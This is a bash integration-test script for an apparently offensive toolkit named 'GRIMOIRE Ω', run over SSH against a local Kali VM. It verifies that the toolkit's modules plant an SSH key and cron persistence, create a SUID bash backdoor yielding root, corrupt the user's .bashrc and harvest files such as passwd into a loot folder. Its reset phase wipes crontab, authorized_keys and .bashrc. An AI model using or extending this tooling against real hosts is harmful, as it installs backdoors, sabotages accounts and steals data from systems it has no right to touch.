#!/bin/bash
# ═══════════════════════════════════════════════════════════════
#  GRIMOIRE Ω — INTEGRATION TEST v2 (FIXED)
# ═══════════════════════════════════════════════════════════════

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'

TARGET="127.0.0.1"; SSH_PORT="2222"; USER="kali"; PASS="2711"; GATEWAY="10.0.2.2"
PASSED=0; FAILED=0; TOTAL=0

pass() { echo -e "  ${GREEN}[✓]${RESET} $1"; PASSED=$((PASSED+1)); TOTAL=$((TOTAL+1)); }
fail() { echo -e "  ${RED}[✗]${RESET} $1"; FAILED=$((FAILED+1)); TOTAL=$((TOTAL+1)); }

ssh_cmd() { sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -p "$SSH_PORT" "$USER@$TARGET" "$1" 2>/dev/null; }

echo -e "${RED}${BOLD}"
echo "  ╔══════════════════════════════════════════════════════╗"
echo "  ║       GRIMOIRE Ω — INTEGRATION TEST v2              ║"
echo "  ╚══════════════════════════════════════════════════════╝"
echo -e "${RESET}\n"

# ═══ PREREQUISITES ═══
echo -e "${YELLOW}═══ PREREQUISITES ═══${RESET}"
command -v grimoire &>/dev/null && pass "grimoire CLI" || fail "grimoire CLI" "not found"
ssh_cmd 'echo ONLINE' | grep -q ONLINE && pass "Kali reachable" || { fail "Kali" "offline"; exit 1; }
python3 -c "from grimoire.arsenal_omega.modules.ghost_hollow import GhostHollow" 2>/dev/null && pass "Ghost Hollow import" || fail "Ghost Hollow import"
python3 -c "from grimoire.arsenal_omega.modules.silicon_death import SiliconDeath" 2>/dev/null && pass "Silicon Death import" || fail "Silicon Death import"
python3 -c "from grimoire.arsenal_omega.modules.data_harvester import DataHarvester" 2>/dev/null && pass "Data Harvester import" || fail "Data Harvester import"
echo ""

# ═══ PHASE 1: RESET ═══
echo -e "${YELLOW}═══ PHASE 1: RESET KALI ═══${RESET}"
ssh_cmd 'rm -f /tmp/.bash_suid /bin/bash.backdoor /tmp/.rs.sh /tmp/.x /tmp/.s /tmp/*.tar.gz /tmp/*.sql 2>/dev/null; crontab -r 2>/dev/null; cat /dev/null > ~/.ssh/authorized_keys 2>/dev/null; echo "alias ls=ls" > ~/.bashrc 2>/dev/null; true'
pass "Kali reset complete"
rm -rf /home/LIGHT/grimoire_loot/127_0_0_1 2>/dev/null
pass "Local loot cleaned"
echo ""

# ═══ PHASE 2: GHOST HOLLOW ═══
echo -e "${YELLOW}═══ PHASE 2: GHOST HOLLOW ═══${RESET}"
grimoire omega ghost-hollow "$TARGET" -u "$USER" -p "$PASS" -P "$SSH_PORT" -g "$GATEWAY" 2>&1 | grep -q "Score:" && pass "Ghost Hollow ran" || fail "Ghost Hollow" "failed"

# Check SSH key (module uses --norc, so check differently)
ssh_cmd 'cat ~/.ssh/authorized_keys 2>/dev/null' | grep -q "ssh-rsa" && pass "SSH key installed" || fail "SSH key" "missing"
# Check crontab
ssh_cmd 'crontab -l 2>/dev/null' | grep -q "authorized_keys" && pass "Cron persistence" || fail "Cron" "missing"
# Check loot
[ -d /home/LIGHT/grimoire_loot/127_0_0_1/ghost_hollow ] && pass "Loot created" || fail "Loot" "missing"
echo ""

# ═══ PHASE 3: SILICON DEATH ═══
echo -e "${YELLOW}═══ PHASE 3: SILICON DEATH ═══${RESET}"
grimoire omega silicon-death "$TARGET" -u "$USER" -p "$PASS" -P "$SSH_PORT" -g "$GATEWAY" 2>&1 | grep -q "Succeeded:" && pass "Silicon Death ran" || fail "Silicon Death" "failed"

# Check SUID bash
ssh_cmd 'ls -la /tmp/.bash_suid 2>/dev/null' | grep -q "rws" && pass "SUID bash created" || fail "SUID bash" "not found"
# Check root via backdoor (using the actual path from module)
ssh_cmd '/tmp/.bash_suid -p -c "id" 2>/dev/null' | grep -q "euid=0" && pass "Root via backdoor" || fail "Root" "backdoor failed"
# Check shell corrupted
ssh_cmd 'cat ~/.bashrc 2>/dev/null' | grep -q "NOPE" && pass "Shell corrupted" || fail "Shell" "not corrupted"
echo ""

# ═══ PHASE 4: DATA HARVESTER ═══
echo -e "${YELLOW}═══ PHASE 4: DATA HARVESTER ═══${RESET}"
grimoire omega data-harvester "$TARGET" -u "$USER" -p "$PASS" -P "$SSH_PORT" 2>&1 | grep -q "Score:" && pass "Data Harvester ran" || fail "Data Harvester" "failed"

# Check loot
DH_DIR=$(ls -d /home/LIGHT/grimoire_loot/127_0_0_1/data_harvester/*/ 2>/dev/null | head -1)
if [ -n "$DH_DIR" ]; then
    DH_FILES=$(find "$DH_DIR" -type f | wc -l)
    pass "Harvested $DH_FILES files"
    [ -f "$DH_DIR/system/passwd.txt" ] && pass "  → passwd extracted"
    [ -f "$DH_DIR/files/.bashrc" ] && pass "  → .bashrc extracted"
else
    fail "Harvest loot" "not found"
fi
echo ""

# ═══ PHASE 5: CROSS-CHECK ═══
echo -e "${YELLOW}═══ PHASE 5: CROSS-MODULE CHECK ═══${RESET}"
# Verify backdoor still works
ssh_cmd '/tmp/.bash_suid -p -c "id" 2>/dev/null' | grep -q "euid=0" && pass "Backdoor survives all modules" || fail "Backdoor" "broken"
# Verify SSH key still there
ssh_cmd 'cat ~/.ssh/authorized_keys 2>/dev/null' | grep -q "ssh-rsa" && pass "SSH key survives" || fail "SSH key" "lost"
echo ""

# ═══ SUMMARY ═══
echo -e "${CYAN}${BOLD}"
echo "  ╔══════════════════════════════════════════════════════╗"
echo "  ║              RESULTS                                 ║"
echo "  ╚══════════════════════════════════════════════════════╝"
echo -e "${RESET}\n"
echo -e "  ${GREEN}PASSED: ${PASSED}${RESET}  ${RED}FAILED: ${FAILED}${RESET}  ${BOLD}TOTAL: ${TOTAL}${RESET}\n"
[ "$FAILED" -eq 0 ] && echo -e "  ${GREEN}${BOLD}✓ ALL TESTS PASSED${RESET}\n" || echo -e "  ${YELLOW}⚠ ${FAILED} tests failed${RESET}\n"
